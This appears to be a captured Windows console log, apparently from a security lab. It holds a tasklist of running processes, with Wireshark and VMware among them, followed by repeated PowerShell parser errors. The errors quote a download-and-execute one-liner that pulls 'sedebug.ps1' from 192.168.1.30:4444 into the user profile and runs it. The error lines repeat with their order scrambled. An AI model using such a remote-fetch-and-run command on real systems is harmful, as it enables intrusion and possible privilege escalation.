+svchost.exe                   1556 Services                   0     15,760 K
+svchost.exe                   2188 Services                   0     10,724 K
+svchost.exe                   2252 Services                   0      6,656 K
+IntelCpHeciSvc.exe            2356 Services                   0      6,680 K
+svchost.exe                   2392 Services                   0     10,288 K
+helperservice.exe             2436 Services                   0      1,472 K
+svchost.exe                   2520 Services                   0      7,876 K
+svchost.exe                   2572 Services                   0      7,020 K
+NVDisplay.Container.exe       2664 Services                   0     17,692 K
+svchost.exe                   2792 Services                   0     13,328 K
+svchost.exe                   2828 Services                   0      7,956 K
+svchost.exe                   2904 Services                   0      5,460 K
+svchost.exe                   2912 Services                   0     14,064 K
+svchost.exe                   2920 Services                   0      7,416 K
+ETDService.exe                2928 Services                   0      5,964 K
+svchost.exe                   2992 Services                   0     16,420 K
+Memory Compression            2144 Services                   0    310,596 K
+svchost.exe                   2876 Services                   0      7,988 K
+svchost.exe                   3080 Services                   0     10,944 K
+svchost.exe                   3124 Services                   0      7,740 K
+igfxCUIService.exe            3148 Services                   0      8,664 K
+svchost.exe                   3272 Services                   0      7,304 K
+svchost.exe                   3284 Services                   0      7,384 K
+svchost.exe                   3292 Services                   0      8,372 K
+svchost.exe                   3416 Services                   0      7,644 K
+svchost.exe                   3564 Services                   0      9,008 K
+NVDisplay.Container.exe       3720 Console                    1     41,728 K
+svchost.exe                   3752 Services                   0     12,780 K
+ETDCtrlHelper.exe             3832 Console                    1      8,640 K
+ETDCtrl.exe                   3840 Console                    1     21,552 K
+svchost.exe                   3920 Services                   0      6,480 K
+svchost.exe                   3928 Services                   0     10,096 K
+svchost.exe                   3980 Services                   0     21,356 K
+conhost.exe                   4036 Services                   0      1,012 K
+svchost.exe                   3604 Services                   0     18,528 K
+svchost.exe                   4132 Services                   0     11,988 K
+svchost.exe                   4140 Services                   0     19,896 K
+svchost.exe                   4196 Services                   0     10,768 K
+spoolsv.exe                   4296 Services                   0     12,464 K
+svchost.exe                   4512 Services                   0     25,912 K
+svchost.exe                   4524 Services                   0     13,776 K
+svchost.exe                   4532 Services                   0      7,740 K
+svchost.exe                   4540 Services                   0     41,772 K
+DAX3API.exe                   4580 Services                   0     10,676 K
+FMService64.exe               4592 Services                   0      6,948 K
+avp.exe                       4604 Services                   0    130,616 K
+OneApp.IGCC.WinService.ex     4616 Services                   0     30,052 K
+JetBrains.Etw.Collector.H     4632 Services                   0      4,200 K
+svchost.exe                   4648 Services                   0      5,200 K
+vmware-authd.exe              4656 Services                   0     10,636 K
+RtkAudUService64.exe          4664 Services                   0      9,084 K
+svchost.exe                   4672 Services                   0      5,964 K
+RstMwService.exe              4680 Services                   0      6,364 K
+sqlwriter.exe                 4688 Services                   0      7,596 K
+svchost.exe                   4708 Services                   0      7,976 K
+jhi_service.exe               4732 Services                   0      4,784 K
+OfficeClickToRun.exe          4752 Services                   0     40,360 K
+vmnetdhcp.exe                 4744 Services                   0      5,092 K
+vmware-usbarbitrator64.ex     4788 Services                   0     11,196 K
+LMS.exe                       4800 Services                   0      8,928 K
+vmnat.exe                     4816 Services                   0      6,860 K
+wlanext.exe                   4832 Services                   0      5,492 K
+svchost.exe                   4904 Services                   0     22,124 K
+esif_uf.exe                   4968 Services                   0      5,724 K
+conhost.exe                   5052 Services                   0      4,708 K
+svchost.exe                   5088 Services                   0      8,832 K
+svchost.exe                   5156 Services                   0      6,688 K
+svchost.exe                   5356 Services                   0      5,024 K
+svchost.exe                   5592 Services                   0      5,616 K
+svchost.exe                   6028 Services                   0     12,992 K
+svchost.exe                   6928 Services                   0      5,288 K
+DAX3API.exe                   7132 Console                    1     10,220 K
+ETDTouch.exe                  6668 Console                    1      5,508 K
+sihost.exe                    6856 Console                    1     27,308 K
+svchost.exe                   7008 Console                    1     27,656 K
+igfxEM.exe                    7092 Console                    1     17,800 K
+svchost.exe                   7104 Console                    1     31,640 K
+svchost.exe                   7288 Services                   0     17,112 K
+taskhostw.exe                 7384 Console                    1     18,140 K
+explorer.exe                  7508 Console                    1    166,508 K
+svchost.exe                   7548 Services                   0      7,552 K
+ctfmon.exe                    7596 Console                    1     23,400 K
+svchost.exe                   7780 Services                   0     18,232 K
+svchost.exe                   7652 Services                   0      8,176 K
+svchost.exe                   8416 Console                    1     32,612 K
+svchost.exe                   8860 Services                   0     12,664 K
+StartMenuExperienceHost.e     7480 Console                    1     89,152 K
+SearchIndexer.exe             9368 Services                   0     49,652 K
+RuntimeBroker.exe             9464 Console                    1     22,364 K
+SearchApp.exe                 9916 Console                    1    245,628 K
+RuntimeBroker.exe             9648 Console                    1     41,860 K
+LockApp.exe                  11068 Console                    1     51,568 K
+svchost.exe                  11168 Services                   0     15,824 K
+RuntimeBroker.exe            11240 Console                    1     33,880 K
+svchost.exe                  10800 Services                   0     10,388 K
+taskhostw.exe                11480 Console                    1     15,924 K
+svchost.exe                  11632 Services                   0     11,316 K
+avpui.exe                    11892 Console                    1      3,492 K
+dllhost.exe                  12252 Services                   0     11,040 K
+RuntimeBroker.exe             3216 Console                    1     25,124 K
+TextInputHost.exe            12640 Console                    1     65,684 K
+WhatsApp.exe                 13124 Console                    1     73,640 K
+SecurityHealthSystray.exe    13208 Console                    1      9,372 K
+SecurityHealthService.exe    13256 Services                   0     15,716 K
+RtkAudUService64.exe         12448 Console                    1      9,888 K
+RuntimeBroker.exe            12444 Console                    1     24,336 K
+Greenshot.exe                 4932 Console                    1     40,916 K
+fdm.exe                      12900 Console                    1     70,436 K
+ONENOTEM.EXE                 12740 Console                    1      2,256 K
+vmplayer.exe                 13104 Console                    1     57,364 K
+svchost.exe                   8136 Services                   0      8,648 K
+vmware-unity-helper.exe       2036 Console                    1     19,208 K
+vmware-vmx.exe                2544 Console                    1  6,575,644 K
+dllhost.exe                   5752 Console                    1     13,324 K
+kpm_tray.exe                 13908 Console                    1      2,796 K
+SystemSettings.exe           13352 Console                    1      2,284 K
+ApplicationFrameHost.exe     12260 Console                    1     31,320 K
+svchost.exe                   9936 Services                   0     23,056 K
+UserOOBEBroker.exe           10496 Console                    1      9,604 K
+svchost.exe                   9700 Console                    1     20,300 K
+ksde.exe                     14004 Services                   0     26,876 K
+SgrmBroker.exe                 412 Services                   0      6,928 K
+svchost.exe                  12528 Services                   0     10,792 K
+ksdeui.exe                   13328 Console                    1      4,396 K
+svchost.exe                   3760 Services                   0      7,600 K
+CalculatorApp.exe             1340 Console                    1      1,564 K
+RuntimeBroker.exe             3500 Console                    1      6,792 K
+Wireshark.exe                14080 Console                    1    219,992 K
+cmd.exe                      14108 Console                    1      1,104 K
+conhost.exe                   7644 Console                    1      1,064 K
+LSB.exe                      11660 Console                    1      1,960 K
+SearchApp.exe                11268 Console                    1     89,176 K
+dumpcap.exe                  12080 Console                    1      8,828 K
+conhost.exe                  11960 Console                    1      7,408 K
+WmiPrvSE.exe                  3968 Services                   0     10,140 K
+svchost.exe                  10856 Services                   0      8,664 K
+Video.UI.exe                 11856 Console                    1      1,548 K
+RuntimeBroker.exe             9768 Console                    1      7,564 K
+svchost.exe                  12344 Services                   0     20,428 K
+Microsoft.Photos.exe         14124 Console                    1      1,880 K
+RuntimeBroker.exe             4888 Console                    1     30,836 K
+ShellExperienceHost.exe       2484 Console                    1     53,752 K
+RuntimeBroker.exe            12600 Console                    1     17,152 K
+explorer.exe                  4104 Console                    1     75,164 K
+notepad.exe                  14320 Console                    1     18,388 K
+smartscreen.exe               1428 Console                    1     29,896 K
+cmd.exe                       2588 Console                    1      4,628 K
+conhost.exe                   5660 Console                    1     20,088 K
+powershell.exe                9456 Console                    1     95,060 K
+notepad.exe                   9808 Console                    1     18,740 K
+svchost.exe                   2116 Services                   0      7,800 K
+svchost.exe                  10368 Services                   0     10,044 K
+svchost.exe                   2032 Services                   0      9,112 K
+RuntimeBroker.exe             6620 Console                    1      9,444 K
+powershell.exe                4316 Console                    1     59,180 K
+conhost.exe                  10228 Console                    1      7,912 K
+tasklist.exe                 13500 Console                    1      9,296 K
+WmiPrvSE.exe                  6364 Services                   0      9,624 K
+++++++++++++++++++  At line:1 char:46
++ (New-Object Net.WebClient).DownloadFileAsync(http://192.168.1.30:4444 ...
++                                              ~
+At line:1 char:46
+Missing ')' in method call.
++ ... lient).DownloadFileAsync(http://192.168.1.30:4444/sedebug.ps1, $env:u ...
++                              ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Unexpected token 'http://192.168.1.30:4444/sedebug.ps1' in expression or statement.
+At line:1 char:82
++ ... ient).DownloadFileAsync(http://192.168.1.30:4444/sedebug.ps1, $env:us ...
++                                                                 ~
+Missing argument in parameter list.
+At line:1 char:112
++ ... /192.168.1.30:4444/sedebug.ps1, $env:userprofile\sedebug.ps1);powersh ...
++                                                                 ~
+Unexpected token ')' in expression or statement.
+    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
+    + FullyQualifiedErrorId : MissingEndParenthesisInMethodCall At line:1 char:46
++                                              ~
++ (New-Object Net.WebClient).DownloadFileAsync(http://192.168.1.30:4444 ...
+At line:1 char:46
+Missing ')' in method call.
++ ... lient).DownloadFileAsync(http://192.168.1.30:4444/sedebug.ps1, $env:u ...
++                              ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Unexpected token 'http://192.168.1.30:4444/sedebug.ps1' in expression or statement.
++ ... ient).DownloadFileAsync(http://192.168.1.30:4444/sedebug.ps1, $env:us ...
+At line:1 char:82
++                                                                 ~
+Missing argument in parameter list.
+At line:1 char:112
++ ... /192.168.1.30:4444/sedebug.ps1, $env:userprofile\sedebug.ps1);powersh ...
++                                                                 ~
+Unexpected token ')' in expression or statement.
+    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
+    + FullyQualifiedErrorId : MissingEndParenthesisInMethodCall At line:1 char:46
++ (New-Object Net.WebClient).DownloadFileAsync(http://192.168.1.30:4444 ...
++                                              ~
+At line:1 char:46
+Missing ')' in method call.
++ ... lient).DownloadFileAsync(http://192.168.1.30:4444/sedebug.ps1, $env:u ...
++                              ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Unexpected token 'http://192.168.1.30:4444/sedebug.ps1' in expression or statement.
+At line:1 char:82
++ ... ient).DownloadFileAsync(http://192.168.1.30:4444/sedebug.ps1, $env:us ...
+Missing argument in parameter list.
+At line:1 char:112
++                                                                 ~
++                                                                 ~
+Unexpected token ')' in expression or statement.
++ ... /192.168.1.30:4444/sedebug.ps1, $env:userprofile\sedebug.ps1);powersh ...
+    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
+    + FullyQualifiedErrorId : MissingEndParenthesisInMethodCall At line:1 char:46
++ (New-Object Net.WebClient).DownloadFileAsync(http://192.168.1.30:4444 ...
++                                              ~
+Missing ')' in method call.
+At line:1 char:46
++ ... lient).DownloadFileAsync(http://192.168.1.30:4444/sedebug.ps1, $env:u ...
++                              ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Unexpected token 'http://192.168.1.30:4444/sedebug.ps1' in expression or statement.
+At line:1 char:82
++ ... ient).DownloadFileAsync(http://192.168.1.30:4444/sedebug.ps1, $env:us ...
++                                                                 ~
+Missing argument in parameter list.
+At line:1 char:112
++ ... /192.168.1.30:4444/sedebug.ps1, $env:userprofile\sedebug.ps1);powersh ...
++                                                                 ~
+Unexpected token ')' in expression or statement.
+    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
+    + FullyQualifiedErrorId : MissingEndParenthesisInMethodCall At line:1 char:46
++                                              ~
++ (New-Object Net.WebClient).DownloadFileAsync(http://192.168.1.30:4444 ...
+At line:1 char:46
+Missing ')' in method call.
++ ... lient).DownloadFileAsync(http://192.168.1.30:4444/sedebug.ps1, $env:u ...
++                              ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Unexpected token 'http://192.168.1.30:4444/sedebug.ps1' in expression or statement.
+At line:1 char:82
++ ... ient).DownloadFileAsync(http://192.168.1.30:4444/sedebug.ps1, $env:us ...
++                                                                 ~
+Missing argument in parameter list.
+At line:1 char:112
++ ... /192.168.1.30:4444/sedebug.ps1, $env:userprofile\sedebug.ps1);powersh ...
++                                                                 ~
+Unexpected token ')' in expression or statement.
+    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
+    + FullyQualifiedErrorId : MissingEndParenthesisInMethodCall
